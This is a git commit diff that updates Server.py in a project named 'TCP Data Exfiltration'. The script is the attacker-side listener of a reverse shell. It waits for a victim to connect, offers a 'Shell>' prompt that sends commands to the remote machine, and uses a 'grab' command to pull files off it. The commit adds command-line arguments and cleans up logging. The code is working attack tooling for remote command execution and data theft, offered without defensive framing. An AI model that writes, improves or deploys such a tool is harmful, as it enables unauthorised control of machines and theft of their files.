0c198e8f4fde4aeb8d6d8fff62c4553863ad3a42
Tarun Sahni <81422161+kalilinux0179@users.noreply.github.com>
2024-07-12 16:26:32 +0530

    Update Server.py

--- TCP Data Exfiltration/Server.py
+++ TCP Data Exfiltration/Server.py
@@ -2,12 +2,12 @@ import socket  # Needed for connection
 import os  # Needed for file operation
 import logging  # Needed for logging
 import sys
+import argparse  # Needed for argument parsing
 
 # Configure logging
 logging.basicConfig(
     level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
 )
-
 
 def transfer(conn, command):
     try:
@@ -17,37 +17,28 @@ def transfer(conn, command):
             while True:
                 bits = conn.recv(1024)
                 if b"Unable to find out the file" in bits:
-                    print("File Doesn't exists")
-                    logging.error("Unable to find out the file")
+                    print("File doesn't exist.")
+                    logging.error("Unable to find out the file: %s", file_name)
                     break
                 elif bits.endswith(b"DONE"):
-                    print("Transfer Completed")
+                    print("Transfer completed.")
                     break
                 else:
                     file.write(bits)
     except Exception as e:
-        logging.error("Error During File Transfer: {e}")
-
+        logging.error("Error during file transfer: %s", e)
 
 def connect(server_ip, server_port):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
         try:
             client.bind((server_ip, server_port))
             client.listen(1)
-            logging.info(
-                "Listening of Incoming Connection on {0}:{1}".format(
-                    server_ip, server_port
-                )
-            )
-            print(
-                "Listening of Incoming Connection on {0}:{1}".format(
-                    server_ip, server_port
-                )
-            )
+            logging.info("Listening for incoming connections on %s:%d", server_ip, server_port)
+            print("Listening for incoming connections on %s:%d" % (server_ip, server_port))
             conn, addr = client.accept()
             with conn:
-                print("Got Connection from {0}:{1}".format(addr[0], addr[1]))
-                logging.info("Got Connection from {0}:{1}".format(addr[0], addr[1]))
+                print("Got connection from %s:%d" % (addr[0], addr[1]))
+                logging.info("Got connection from %s:%d", addr[0], addr[1])
                 while True:
                     try:
                         command = input("Shell> ")
@@ -55,7 +46,6 @@ def connect(server_ip, server_port):
                             continue
                         elif command.lower().strip() == "exit":
                             conn.send("exit".encode())
-                            conn.close()
                             break
                         elif command.startswith("grab"):
                             transfer(conn, command)
@@ -65,18 +55,22 @@ def connect(server_ip, server_port):
                     except KeyboardInterrupt:
                         print("Exiting...")
                         sys.exit()
-        except KeyboardInterrupt:
-            print("Exiting...")
-            sys.exit()
         except Exception as e:
-            logging.error("Error during connection: {e}")
-
+            logging.error("Error during connection: %s", e)
+            print("An error occurred, please check the logs.")
 
 def main():
-    server_ip = "192.168.1.13"
-    server_port = 9999
-    connect(server_ip, server_port)
+    parser = argparse.ArgumentParser(description="Simple file transfer server.")
+    parser.add_argument('--ip', type=str, default='192.168.1.13',
+                        help='Server IP address to listen on (default: 192.168.1.13)')
+    parser.add_argument('--port', type=int, default=9999,
+                        help='Server port to listen on (default: 9999)')
+    
+    args = parser.parse_args()
 
+    server_ip = args.ip
+    server_port = args.port
+    connect(server_ip, server_port)
 
 if __name__ == "__main__":
     main()
